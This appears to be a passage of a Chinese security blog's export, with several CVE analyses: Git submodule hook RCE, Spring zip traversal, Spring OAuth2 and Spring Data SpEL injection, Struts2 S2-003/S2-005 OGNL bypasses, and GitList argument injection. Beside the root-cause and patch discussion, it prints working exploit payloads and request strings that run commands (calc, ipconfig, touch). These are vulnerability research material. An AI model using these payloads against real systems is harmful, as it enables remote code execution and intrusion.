将目录.git/modules/vuln拷贝到当前目录modules下。 往modules/vuln目录中的hooks目录添加hook脚本 构造子模块，使其name成为../../modules/vuln，使子模块的Git目录信息指向当前目录下module/vuln 构造repo，使其在git clone时触发hook脚本 先考虑前2条，即对应build.sh中下述代码1234mkdir modulescp -r .git/modules/vuln modulescp ../vuln.sh modules/vuln/hooks/post-checkoutgit add modules 第三条：1git config -f .gitmodules --rename-section submodule.vuln submodule.../../modules/vuln 第四点，为了让.git/modules/../../modules/vuln即modules/vuln下的hooks目录中的hook脚本被调用，执行下述语句：12git submodule add &quot;$repo_submodule&quot;git commit -m &quot;CVE-2018-11235&quot; 再添加一个子模块。当Git地进行git clone --recurse-submodules时，会发现clone下来的目录中已经有了对应的子模块项目，因此实际上不需要clone，只要进行check out就行。而在check out时则会调用post-checkout脚本。 上述的分析针对 git version 2.17.0 进行。在一些低版本的Git中，由于功能等差异，可能上述环境会出错。Tony Torralba在其博客中复现了Git 2.7.4版本的漏洞，需要利用符号链接来进行RCE，具体的利用过程见 CVE-2018-11235 - Quick &amp; Dirty PoC 补丁浅析补丁见：https://github.com/git/git/commit/0383bbb9015898cbc79abd7b64316484d7713b44 主要是对从.gitmodules中获取的name进行了检查 在name_and_item_from_var(var, &amp;name, &amp;item)函数中调用了check_submodule_name来进行检查： Git在14年也爆过RCE洞(CVE-2014–9390)，其原理也是利用了目录穿越加覆盖配置文件，在checkout时进行RCE。具体可见参考链接。 有些地方可能没解释清楚或有不当的地方，欢迎留言讨论。 Reference Rogdham/CVE-2018-11235 Remediating the May 2018 Git Security Vulnerability Git 工具 - 子模块 CVE-2014–9390 atorralba：CVE-2018-11235 - Quick &amp; Dirty PoC]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Unsafe Unzip with spring-integration-zip 分析-【CVE-2018-1261 与 CVE-2018-1263】]]></title>
      <url>%2F2018%2F05%2F14%2FUnsafe-Unzip-with-spring-integration-zip-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1261-%E4%B8%8E-CVE-2018-1263%E3%80%91%2F</url>
      <content type="text"><![CDATA[Unsafe Unzip with spring-integration-zip 分析-【CVE-2018-1261 与 CVE-2018-1263】 漏洞公告https://pivotal.io/security/cve-2018-1261 关于 CVE-2018-1263 ，见补丁浅析部分。 漏洞分析 从简单的测试代码开始：123456789101112131415161718public final class Main &#123; private static ResourceLoader resourceLoader = new DefaultResourceLoader(); private static File path = new File("./here/"); public static void main(final String... args) &#123; final Resource evilResource = resourceLoader.getResource("classpath:zip-malicious-traversal.zip"); try&#123; InputStream evilIS = evilResource.getInputStream(); Message&lt;InputStream&gt; evilMessage = MessageBuilder.withPayload(evilIS).build(); UnZipTransformer unZipTransformer = new UnZipTransformer(); unZipTransformer.setWorkDirectory(path); unZipTransformer.afterPropertiesSet(); unZipTransformer.transform(evilMessage); &#125;catch (Exception e)&#123; System.out.println(e); &#125; &#125;&#125; 其中zip-malicious-traversal.zip即恶意的压缩包，结构如下： unZipTransformer.setWorkDirectory(path);设置了正常情况下解压目录为当前目录下的here文件夹，如上gif所示，在here文件夹中生成了good.txt。而evil.txt却逃逸出了这个限制，在G://tmp下生成了。 环境相关源码见附件。为了复现漏洞，需要在硬盘根目录下先创建一个tmp目录，zip-malicious-traversal.zip在CVE-2018-1261\src\main\resources中。 跟踪代码，在unZipTransformer.transform(evilMessage);处打上断点跟入。当控制流到达 org/springframework/integration/zip/transformer/UnZipTransformer.java:1121ZipUtil.iterate(inputStream, new ZipEntryCallback() &#123; ... &#125;); 这里会将inputStream输入，ZipEntryCallback作为回调函数。跟入iterate 至org/zeroturnaround/zip/ZipUtil.java。1234567891011121314151617public static void iterate(InputStream is, ZipEntryCallback action, Charset charset) &#123; try &#123; ZipInputStream in = null; if (charset == null) &#123; in = new ZipInputStream(new BufferedInputStream(is)); &#125; else &#123; ... &#125; ZipEntry entry; while ((entry = in.getNextEntry()) != null) &#123; try &#123; action.process(in, entry); &#125; ... &#125; &#125; ...&#125; 在iterate中，通过in = new ZipInputStream(new BufferedInputStream(is));生成了ZipInputStream对象in，此后通过in.getNextEntry()来获取对象in中的一个个条目。对于getNextEntry()而已，它会直接把目录给打印出来，具体可以参见stackoverflow: How does ZipInputStream.getNextEntry() work?。所以对于zip-malicious-traversal.zip而言 回到UnZipTransformer.java： 可以看到entry的值即为../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../tmp/evil.txt。 此后调用回调函数process:1234567891011121314151617public void process(InputStream zipEntryInputStream, ZipEntry zipEntry) throws IOException &#123; final String zipEntryName = zipEntry.getName(); ... if (ZipResultType.FILE.equals(zipResultType)) &#123; final File tempDir = new File(workDirectory, message.getHeaders().getId().toString()); tempDir.mkdirs(); //NOSONAR false positive final File destinationFile = new File(tempDir, zipEntryName); if (zipEntry.isDirectory()) &#123; ... &#125; else &#123; SpringZipUtils.copy(zipEntryInputStream, destinationFile); uncompressedData.put(zipEntryName, destinationFile); &#125; &#125; ...&#125; tempDir是临时生成的文件夹，而zipEntryName通过zipEntry.getName()得到，即为../../../那一串。接着通过final File destinationFile = new File(tempDir, zipEntryName);确定解压目录，也正是这里造成了跨越目录漏洞。接着就是调用copy把数据写到destinationFile处。 究其原因，对于getNextEntry而言,../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../tmp仅仅是目录名字，而对于copy操作而言，../../../等将被解释为目录穿越操作从而造成了任意解压。 补丁浅析1.0.1.RELEASE中的补丁 Disallow traversal entity in zip，主要是在进行copy操作前，对zipEntryName进行了检查12345678910111213 if (zipEntryName.contains("..") &amp;&amp; !destinationFile.getCanonicalPath().startsWith(workDirectory.getCanonicalPath())) &#123; throw new ZipException("The file " + zipEntryName + " is trying to leave the target output directory of " + workDirectory); &#125;``` 对于恶意的压缩包，假设`destinationFile`值为`.\here\e401f4b8-0ecb-3f3a-76ce-5318b14d6000\..\..\tmp\evil.txt`时，通过调用`destinationFile.getCanonicalPath()`把``.`和`..`解析成对应的正确的路径，获得它规范化的绝对路径。之后再与工作目录`workDirectory.getCanonicalPath()`比较来确定是否存在目录穿越。对于恶意的压缩包，在生成了`destinationFile`后，假设值为`.\here\e401f4b8-0ecb-3f3a-76ce-5318b14d6000\..\..\tmp\evil.txt`时，通过调用`destinationFile.getCanonicalPath()`把``.`和`..`解析成对应的正确的路径，获得它规范化的绝对路径。之后再与工作目录`workDirectory.getCanonicalPath()`比较来确定是否存在目录穿越。之后，2018年5月11日pivotal又再次放出公告：![11.png](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/11.png?raw=true)原因在于： While the framework itself now does not write such files, it does present the errant path to the user application, which could inadvertently write the file using that path.12345也就是说，生成的`destinationFile`其实是错误的，尽管框架本身不会有问题不会出现目录遍历漏洞，但是对于应用而言，可能之后直接使用了`destinationFile`这个路径来进行操作从而导致错误。因此在1.0.2.RELEASE版本中的补丁中[[Dissallow traversal entry even for byte[]](https://github.com/spring-projects/spring-integration-extensions/commit/d10f537283d90eabd28af57ac97f860a3913bf9b)，直接在生成`destinationFile`时做了检查：```java final File destinationFile = checkPath(message, zipEntryName); 除此之外，在 Remove unnecessary check for the ..中还将zipEntryName.contains(&quot;..&quot;)的判断删除，因为认为是不必要的。 漏洞考古类似的压缩文件目录遍历漏洞以前也出现不少，列举几个。 安卓：三星默认输入法远程代码执行 Python：Exploiting insecure file extraction in Python for code execution GNU tar 解压路径绕过漏洞]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[RCE with spring-security-oauth2 分析-【CVE-2018-1260】]]></title>
      <url>%2F2018%2F05%2F12%2FRCE-with-spring-security-oauth2-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1260%E3%80%91%2F</url>
      <content type="text"><![CDATA[RCE with spring-security-oauth2 分析-【CVE-2018-1260】 漏洞公告 环境搭建利用github上已有的demo：1git clone https://github.com/wanghongfei/spring-security-oauth2-example.git 确保导入的spring-security-oauth2为受影响版本，以这里为例为2.0.10 进入spring-security-oauth2-example，修改 cn/com/sina/alan/oauth/config/OAuthSecurityConfig.java的第67行:1234567@Overridepublic void configure(ClientDetailsServiceConfigurer clients) throws Exception &#123; clients.inMemory() .withClient("client") .authorizedGrantTypes("authorization_code") .scopes();&#125; 根据spring-security-oauth2-example创建对应的数据库等并修改AlanOAuthApplication中对应的mysql相关配置信息。 访问：1http://localhost:8080/oauth/authorize?client_id=client&amp;response_type=code&amp;redirect_uri=http://www.github.com/chybeta&amp;scope=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22calc.exe%22%29%7D 会重定向到login页面，随意输入username和password，点击login，触发payload。 漏洞分析先简要补充一下关于OAuth2.0的相关知识。 以上图为例。当用户使用客户端时，客户端要求授权，即图中的AB。接着客户端通过在B中获得的授权向认证服务器申请令牌，即access token。最后在EF阶段，客户端带着access token向资源服务器请求并获得资源。 在获得access token之前，客户端需要获得用户的授权。根据标准，有四种授权方式：授权码模式（authorization code）、简化模式（implicit）、密码模式（resource owner password credentials）、客户端模式（client credentials）。在这几种模式中，当客户端将用户导向认证服务器时，都可以带上一个可选的参数scope，这个参数用于表示客户端申请的权限的范围。 ，根据官方文档，在spring-security-oauth的默认配置中scope参数默认为空：1scope: The scope to which the client is limited. If scope is undefined or empty (the default) the client is not limited by scope. 为明白起见，我们在demo中将其清楚写出：1234clients.inMemory() .withClient("client") .authorizedGrantTypes("authorization_code") .scopes(); 接着开始正式分析。当我们访问http://localhost:8080/oauth/authorize重定向至http://localhost:8080/login并完成login后程序流程到达org/springframework/security/oauth2/provider/endpoint/AuthorizationEndpoint.java，这里贴上部分代码：12345678910111213141516171819202122232425@RequestMapping(value = "/oauth/authorize")public ModelAndView authorize(Map&lt;String, Object&gt; model, @RequestParam Map&lt;String, String&gt; parameters, SessionStatus sessionStatus, Principal principal) &#123; // Pull out the authorization request first, using the OAuth2RequestFactory. All further logic should // query off of the authorization request instead of referring back to the parameters map. The contents of the // parameters map will be stored without change in the AuthorizationRequest object once it is created. AuthorizationRequest authorizationRequest = getOAuth2RequestFactory().createAuthorizationRequest(parameters); try &#123; ... // We intentionally only validate the parameters requested by the client (ignoring any data that may have // been added to the request by the manager). oauth2RequestValidator.validateScope(authorizationRequest, client); ... // Place auth request into the model so that it is stored in the session // for approveOrDeny to use. That way we make sure that auth request comes from the session, // so any auth request parameters passed to approveOrDeny will be ignored and retrieved from the session. model.put("authorizationRequest", authorizationRequest); return getUserApprovalPageResponse(model, authorizationRequest, (Authentication) principal); &#125; ... 第115行 在执行完AuthorizationRequest authorizationRequest = ...后，authorizationRequest代表了要认证的请求，其中包含了众多参数 在经过了对一些参数的处理，比如RedirectUri等，之后到达第156行：123// We intentionally only validate the parameters requested by the client (ignoring any data that may have// been added to the request by the manager).oauth2RequestValidator.validateScope(authorizationRequest, client); 在这里将对scope参数进行验证。跟入validateScope到org/springframework/security/oauth2/provider/request/DefaultOAuth2RequestValidator.java:191234567public class DefaultOAuth2RequestValidator implements OAuth2RequestValidator &#123; public void validateScope(AuthorizationRequest authorizationRequest, ClientDetails client) throws InvalidScopeException &#123; validateScope(authorizationRequest.getScope(), client.getScope()); &#125; ...&#125; 继续跟入validateScope，至 org/springframework/security/oauth2/provider/request/DefaultOAuth2RequestValidator.java:281234567891011121314private void validateScope(Set&lt;String&gt; requestScopes, Set&lt;String&gt; clientScopes) &#123; if (clientScopes != null &amp;&amp; !clientScopes.isEmpty()) &#123; for (String scope : requestScopes) &#123; if (!clientScopes.contains(scope)) &#123; throw new InvalidScopeException("Invalid scope: " + scope, clientScopes); &#125; &#125; &#125; if (requestScopes.isEmpty()) &#123; throw new InvalidScopeException("Empty scope (either the client or the user is not allowed the requested scopes)"); &#125;&#125; 首先检查clientScopes，这个clientScopes即我们在前面configure中配置的.scopes();，倘若不为空，则进行白名单检查。举个例子，如果前面配置.scopes(&quot;chybeta&quot;);，则传入requestScopes必须为chybeta，否则会直接抛出异常Invalid scope:xxx。但由于此处查clientScopes为空值，则接下来仅仅做了requestScopes.isEmpty()的检查并且通过。 在完成了各项检查和配置后，在authorize函数的最后执行：1return getUserApprovalPageResponse(model, authorizationRequest, (Authentication) principal); 回想一下前面OAuth2.0的流程，在客户端请求授权（A），用户登陆认证（B）后，将会进行用户授权（C），这里即开始进行正式的授权阶段。跟入getUserApprovalPageResponse 至org/springframework/security/oauth2/provider/endpoint/AuthorizationEndpoint.java:241： 生成对应的model和view，之后将会forward到/oauth/confirm_access。为简单起见，我省略中间过程，直接定位到org/springframework/security/oauth2/provider/endpoint/WhitelabelApprovalEndpoint.java:20123456789101112public class WhitelabelApprovalEndpoint &#123; @RequestMapping("/oauth/confirm_access") public ModelAndView getAccessConfirmation(Map&lt;String, Object&gt; model, HttpServletRequest request) throws Exception &#123; String template = createTemplate(model, request); if (request.getAttribute("_csrf") != null) &#123; model.put("_csrf", request.getAttribute("_csrf")); &#125; return new ModelAndView(new SpelView(template), model); &#125; ...&#125; 跟入createTemplate，第29行：12345678protected String createTemplate(Map&lt;String, Object&gt; model, HttpServletRequest request) &#123; String template = TEMPLATE; if (model.containsKey("scopes") || request.getAttribute("scopes") != null) &#123; template = template.replace("%scopes%", createScopes(model, request)).replace("%denial%", ""); &#125; ... return template;&#125; 跟入createScopes，第46行： 这里获取到了scopes，并且通过for循环生成对应的builder，其实就是html和一些标签等，最后返回的即builder.toString(),其值如下:1&lt;ul&gt;&lt;li&gt;&lt;div class='form-group'&gt;scope.$&#123;T(java.lang.Runtime).getRuntime().exec("calc.exe")&#125;: &lt;input type='radio' name='scope.$&#123;T(java.lang.Runtime).getRuntime().exec("calc.exe")&#125;' value='true'&gt;Approve&lt;/input&gt; &lt;input type='radio' name='scope.$&#123;T(java.lang.Runtime).getRuntime().exec("calc.exe")&#125;' value='false' checked&gt;Deny&lt;/input&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ul&gt; createScopes结束后将会把上述builder.toString()拼接到template中。createTemplate结束后，在getAccessConfirmation的最后：1return new ModelAndView(new SpelView(template), model); 根据template生成对应的SpelView对象，这是其构造函数： 此后在页面渲染的过程中，将会执行页面中的Spel表达式${T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)}从而造成代码执行。 所以综上所述，这个任意代码执行的利用条件实在“苛刻”： 需要scopes没有配置白名单，否则直接Invalid scope:xxx。不过大部分OAuth都会限制授权的范围，即指定scopes。 使用了默认的Approval Endpoint，生成对应的template，在spelview中注入spel表达式。不过可能绝大部分使用者都会重写这部分来满足自己的需求，从而导致spel注入不成功。 补丁commit记录： https://github.com/spring-projects/spring-security-oauth/commit/adb1e6d19c681f394c9513799b81b527b0cb007c 官方将SpelView去除，使用其他方法来生成对应的视图 资料 CVE-2018-1260: Remote Code Execution with spring-security-oauth2 spring-security-oauth:Authorization Server Configuration 阮一峰:理解OAuth 2.0]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[【struts2 命令/代码执行漏洞分析系列】S2-003和S3-005]]></title>
      <url>%2F2018%2F05%2F08%2F%E3%80%90struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-003%E5%92%8CS3-005%2F</url>
      <content type="text"><![CDATA[阿里先知安全社区：【struts2 命令/代码执行漏洞分析系列】S2-003和S3-005 S2-003漏洞信息漏洞信息页面： https://cwiki.apache.org/confluence/display/WW/S2-003 漏洞成因官方概述：XWork ParameterInterceptors bypass allows OGNL statement execution 漏洞影响： 环境搭建s2-003漏洞的payload用到了特殊字符，在高版本tomcat中会失败，需要使用tomcat6来测试。我使用的是6.0.9版本。此外导入的struts版本为2.0.11.2 漏洞利用POC:1(&apos;\u0023context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\u003dfalse&apos;)(bla)(bla)&amp;(&apos;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\&apos;calc\&apos;)&apos;)(bla)(bla) 回显：1(&apos;\u0023context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\u003dfalse&apos;)(bla)(bla)&amp;(&apos;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&apos;)(kxlzx)(kxlzx)&amp;(&apos;\u0023mycmd\u003d\&apos;ipconfig\&apos;&apos;)(bla)(bla)&amp;(&apos;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&apos;)(bla)(bla)&amp;(A)((&apos;\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())&apos;)(bla))&amp;(B)((&apos;\u0023myres\u003dnew\40byte[51020]&apos;)(bla))&amp;(C)((&apos;\u0023mydat.readFully(\u0023myres)&apos;)(bla))&amp;(D)((&apos;\u0023mystr\u003dnew\40java.lang.String(\u0023myres)&apos;)(bla))&amp;(&apos;\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()&apos;)(bla)(bla)&amp;(E)((&apos;\u0023myout.getWriter().println(\u0023mystr)&apos;)(bla)) 漏洞分析在struts/xwork-2.0.5-sources.jar!/com/opensymphony/xwork2/interceptor/ParametersInterceptor.java:177 获取到我们传入的参数 在getValueStack之前，执行了一些初始化操作，比如：1OgnlContextState.setDenyMethodExecution(contextMap, true); 将xwork.MethodAccessor.denyMethodExecution设置为true。为了能够调用方法，需要在poc中的第一部分将denyMethodExecution设置为false，之后才能任意代码执行。 跟入setParameters(action, stack, parameters);至 struts/struts/xwork-2.0.5-sources.jar!/com/opensymphony/xwork2/interceptor/ParametersInterceptor.java:201。此部分开始通过迭代器取出一个个传入的参数，并进行处理。 假设此时我传入的参数如下，注意这个与poc的不同在于，我将第一个\u0023替换成了#。：1(&apos;#context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\u003dfalse&apos;)(bla)(bla)&amp;(&apos;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\&apos;calc\&apos;)&apos;)(bla)(bla) 跟入acceptableName至 struts/xwork-2.0.5-sources.jar!/com/opensymphony/xwork2/interceptor/ParametersInterceptor.java:271123456protected boolean acceptableName(String name) &#123; if (isAccepted(name) &amp;&amp; !isExcluded(name)) &#123; return true; &#125; return false;&#125; 跟入isAccepted(name) 这里通过简单的正则表达式[\p{Graph}&amp;&amp;[^,#:=]]*来检测，防止传入恶意特殊字符开头如#等。因此acceptableName返回false，接下来的ognl表达式自然也不会执行了。1234if (acceptableName) &#123; Object value = entry.getValue(); ...&#125; 但如果传入经过编码后的payload。#对应的unicode为\u0023，八进制为\43，则可以绕过上述的检测，也即导致acceptableName为true，从而进一步执行。 在设置denyMethodExecution为false后，poc的第二部分就是通过方法调用来执行任意命令了：1(&apos;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\&apos;calc\&apos;)&apos;)(bla)(bla) S2-005漏洞信息漏洞信息页面： https://cwiki.apache.org/confluence/display/WW/S2-005 漏洞成因官方概述：XWork ParameterInterceptors bypass allows remote command execution 漏洞影响： 漏洞分析S2-005的出现时因为官方对S2-003的修补的不完全导致的。官方通过增加安全配置禁止静态方法调用（allowStaticMethodAcces）和类方法执行（MethodAccessor.denyMethodExecution）等来修补。但同样的直接使用上面的技巧，更改poc为：1(&apos;\u0023_memberAccess[\&apos;allowStaticMethodAccess\&apos;]&apos;)(meh)=true&amp;(aaa)((&apos;\u0023context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\u003d\u0023foo&apos;)(\u0023foo\u003dnew%20java.lang.Boolean(&quot;false&quot;)))&amp;(asdf)((&apos;\u0023rt.exit(1)&apos;)(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1 即可设置allowStaticMethodAccess为true，和denyMethodExecution为false，从而导致任意命令执行。可以参考Struts2漏洞分析与研究之S2-005漏洞分析和CVE-2010-1870: Struts2/XWork remote command execution。其余的代码调用等，与S2-003相同，分析见上。 ognl的解析一个问题，为什么\u0023形式的poc能够被解析呢？https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/8.png?raw=true 跟入setValue 至 struts/xwork-2.0.5-sources.jar!/com/opensymphony/xwork2/util/OgnlValueStack.java:170 跟入OgnlUtil.setValue,struts/xwork-2.0.5-sources.jar!/com/opensymphony/xwork2/util/OgnlUtil.java:185 123public static void setValue(String name, Map context, Object root, Object value) throws OgnlException &#123; Ognl.setValue(compile(name), context, root, value);&#125; 此处name即我们传入的参数(\u0023...，跟入compile中的o = Ognl.parseExpression(expression);: 123456public static Object parseExpression( String expression ) throws OgnlException&#123; try &#123; OgnlParser parser = new OgnlParser( new StringReader(expression) ); return parser.topLevelExpression(); &#125; 从topLevelExpression就开始了进行语法分析工作。在获得(的token为44后，接着进行expression();的解析。 在其中会调用到 ognl/JavaCharStream.java 的readChar。其中代码摘取部分如下：12345678910111213141516171819202122232425262728293031public char readChar() throws java.io.IOException&#123; ... char c; if ((buffer[bufpos] = c = ReadByte()) == '\\') &#123; ... int backSlashCnt = 1; for (;;) // Read all the backslashes &#123; try &#123; if ((buffer[bufpos] = c = ReadByte()) != '\\') &#123; UpdateLineColumn(c); // found a non-backslash char. if ((c == 'u') &amp;&amp; ((backSlashCnt &amp; 1) == 1)) &#123; if (--bufpos &lt; 0) bufpos = bufsize - 1; break; &#125; backup(backSlashCnt); return '\\'; &#125; &#125; ... &#125; 读取\，并在之后如果遇到了u则进一步处理：从而把\u0023转换成了#。之后执行ognl表达式时即执行&quot;#context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]=false&quot;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[GitList 0.6 Unauthenticated RCE 分析]]></title>
      <url>%2F2018%2F04%2F30%2FGitList-0-6-Unauthenticated-RCE-%E5%88%86%E6%9E%90%2F</url>
      <content type="text"><![CDATA[GitList 0.6 Unauthenticated RCE 分析 漏洞环境搭建Gitlist 0.6 下载地址： https://github.com/klaussilveira/gitlist/releases/download/0.6.0/gitlist-0.6.0.tar.gz 解压出来后，将其中的config.ini-example重命名为config.ini，并将其中第四行修改指向repo的地址，以我为例：1repositories[] = &apos;/home/chybeta/test/&apos; 在test目录下建立repo：123456mkdir gitlist_rcecd gitlist_rceecho &quot;chybeta&quot; &gt; README.mdgit initgit add *git commit -m &quot;gitlist_rce&quot; 其余问题，可以直接参考Installing GitList for Local Reposs 漏洞分析在 gitlist/src/Controller/TreeController.php:51行：1234567891011&lt;?$route-&gt;post('&#123;repo&#125;/tree/&#123;branch&#125;/search', function (Request $request, $repo, $branch = '', $tree = '') use ($app) &#123; $repository = $app['git']-&gt;getRepositoryFromName($app['git.repos'], $repo); if (!$branch) &#123; $branch = $repository-&gt;getHead(); &#125; $query = $request-&gt;get('query'); $breadcrumbs = [['dir' =&gt; 'Search results for: ' . $query, 'path' =&gt; '']]; $results = $repository-&gt;searchTree($query, $branch);... 当我们在repo中进行搜索时，以搜索字符串”chybeta”为例 123POST /gitlist/gitlist_rce/tree/master/search HTTP/1.1query=chybeta 则对应的变量即为：123repo =&gt; gitlist_rcebranch =&gt; masterquery =&gt; chybeta 进入到searchTree函数中，即gitlist/src/Git/Repository.php第320行：1234567891011121314&lt;?php public function searchTree($query, $branch) &#123; if (empty($query)) &#123; return null; &#125; $query = escapeshellarg($query); try &#123; $results = $this-&gt;getClient()-&gt;run($this, "grep -i --line-number &#123;$query&#125; $branch"); &#125; catch (\RuntimeException $e) &#123; return false; &#125; query参数经过了escapeshellarg函数的过滤，官方文档: escapeshellarg()把字符串转码为可以在 shell 命令里使用的参数。 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符. 之后进入run方法，gitlist/vendor/klaussilveira/gitter/lib/Gitter/Client.php:63：123456789public function run($repository, $command)&#123; if (version_compare($this-&gt;getVersion(), '1.7.2', '&gt;=')) &#123; $command = '-c "color.ui"=false ' . $command; &#125; $process = new Process($this-&gt;getPath() . ' ' . $command, $repository-&gt;getPath()); $process-&gt;setTimeout(180); $process-&gt;run(); 在$process = new Process()处最终构成的命令为：1/usr/bin/git grep -i --line-number &apos;chybeta&apos; master 在git grep命令中提到： Open the matching files in the pager (not the output of grep). If the pager happens to be “less” or “vi”, and the user specified only one pattern, the first file is positioned at the first match automatically. The pager argument is optional; if specified, it must be stuck to the option without a space. If pager is unspecified, the default pager will be used (see core.pager in git-config[1]). 本意上，这个参数的作用是可以选择pager，比如less或者vi，在查找到匹配的文件后使用指定的pager打开。比如匹配到的文件是README.md，则相当于执行vi READEME.md或less README.md。但倘若我们指定--open-files-in-pager=id;，注意有一个;，则在匹配到文件后，则相当于执行id; README.md，在unix中分号表示顺序的执行各条命令而不关心是否失败。 不过在执行之前经过了escapeshellarg，会在字符串两边加上单引号，这会有影响吗？不会。 所以当构造如下的数据包：123POST /gitlist/gitlist_rce/tree/c/search HTTP/1.1query=--open-files-in-pager=touch /tmp/test/chybeta 注意修改了tree/master/search 为tree/c/search，也即使branch值为c，这样拼接出来的最后的语句即为：1/usr/bin/git grep -i --line-number &apos;--open-files-in-pager=touch /tmp/test/chybeta&apos; c 当进行查找时，由于READEME.md（内容为chybeta）中含有字符c，因此可以查找成功，之后由于注入参数的关系，将会执行touch /tmp/test/chybeta，将会在/tmp/test/目录下创建一个新的文件。 参考 谈escapeshellarg绕过与参数注入漏洞 Exploit/bypass PHP escapeshellarg/escapeshellcmd functions Gitlist - Commit to Rce Installing GitList for Local Reposs]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Spring Data Commons Remote Code Execution 分析-【CVE-2018-1273】]]></title>
      <url>%2F2018%2F04%2F11%2FSpring-Data-Commons-Remote-Code-Execution-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1273%E3%80%91%2F</url>
      <content type="text"><![CDATA[Spring Data Commons Remote Code Execution 分析-【CVE-2018-1273】 前言https://pivotal.io/security/cve-2018-1273 漏洞影响版本： 2.0.x users should upgrade to 2.0.6 1.13.x users should upgrade to 1.13.11 Older versions should upgrade to a supported branch 探索过程从漏洞公告页的Refference给出的两个链接commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a和commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653，可以看出该漏洞为SpEL注入。 在漏洞发现者Philippe Arteau @h3xstream的推文和回复中提到：12345@requestMapping("/users")class UserController &#123; @requestsMapping(method= RequestMethod.POST) public Object register(UserForm userForm, BindingResult binding, Model model)&#123;&#125;&#125; 此外 Spring Data Team @SpringData在该推文中回复：12Spring Data Team‏That&apos;s only true if the form backing object is a projection interface. Simple DTOs are safe. 因此可以推测出几个漏洞条件： Spel注入 a form accessible form backing object is a projection interface 另外根据Philippe Arteau @h3xstream提供的示例代码，不难发现这是spring官方的示例代码 spring-data-examples 中的一部分 因此环境搭建以及漏洞探索过程不妨从此入手。 环境搭建1git clone https://github.com/spring-projects/spring-data-examples 我直接采用默认配置pom.xml，对应的Spring Data Commons版本为2.0.5 运行其中的web\example。这是一个简单的注册页面，输入用户名、密码并重复。 抓包，修改payload数据：1username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc.exe&quot;)]=chybeta&amp;password=chybeta&amp;repeatedPassword=chybeta 漏洞分析限于能力，还真不知道这个洞该从何谈起。干脆就定位到 org/springframework/data/web/MapDataBinder.java:174 。之所以定位到这里，官方的commit中在这里去除了StandardEvaluationContext，改用SimpleEvaluationContext。 可以看到这里的propertyName即我们传入的参数名，其中带有了payaload。 继续执行至187行，对其进行解析parseExpression(propertyName) 继续执行到217行，解析了spel表达式，成功执行calc.exe。 跟spring-messaging Remote Code Execution 分析-【CVE-2018-1270】中使用的expression.getValue(context, Boolean.class)不同，这里执行spel表达式使用的是expression.setValue(context, value)。以后在找类似的spel表达式注入时可以针对性查找这两条语句。 上图来自0c0c0f师傅的CVE-2018-1270 Remote Code Execution with spring-messaging 漏洞修补以 spring-data-commons 2.0.6 版本为例 https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653 换用SimpleEvaluationContext，用于实现简单的数据绑定，保持灵活性减少安全隐患（来自360cert语）。 参考 DATACMNS-1282 DATACMNS-1264 projections spring-data-examples xxlegend大师傅 后记Spring Data Commons 2.0.5版本怼了一天，从早上8点怼到现在，尽管确定了Spel注入点，但就是用普通的表达式弹不出计算器。比如使用 T(java.lang.Runtime).getRuntime().exec(&#39;calc.exe&#39;) 用动态调用(new java.lang.ProcessBuilder(&#39;calc&#39;)).start()的方式也会触发失败。 刚刚才看到xxlegend大师傅在其中说明了原因Spring Data Commons 2.0.5版本中 MapDataBinder.java 的182添加了：123context.setTypeLocator(typeName -&gt; &#123; throw new SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName);&#125;); 最后用下面的payload可以绕过1username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc.exe&quot;)]=chybeta&amp;password=chybeta&amp;repeatedPassword=chybeta 另外matthiaskaiser 在 https://gist.github.com/matthiaskaiser/bfb274222c009b3570ab26436dc8799e 给出了另一个payload：1username[#this.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(&apos;xterm&apos;)&quot;)]=asdf 关于这个payload是怎么出来的，可以借鉴以下几个漏洞 ElasticSearch Groovy脚本远程代码执行漏洞分析（CVE-2015-1427） WebView 远程代码执行漏洞浅析]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Thinkphp框架 < 5.0.16 sql注入漏洞分析]]></title>
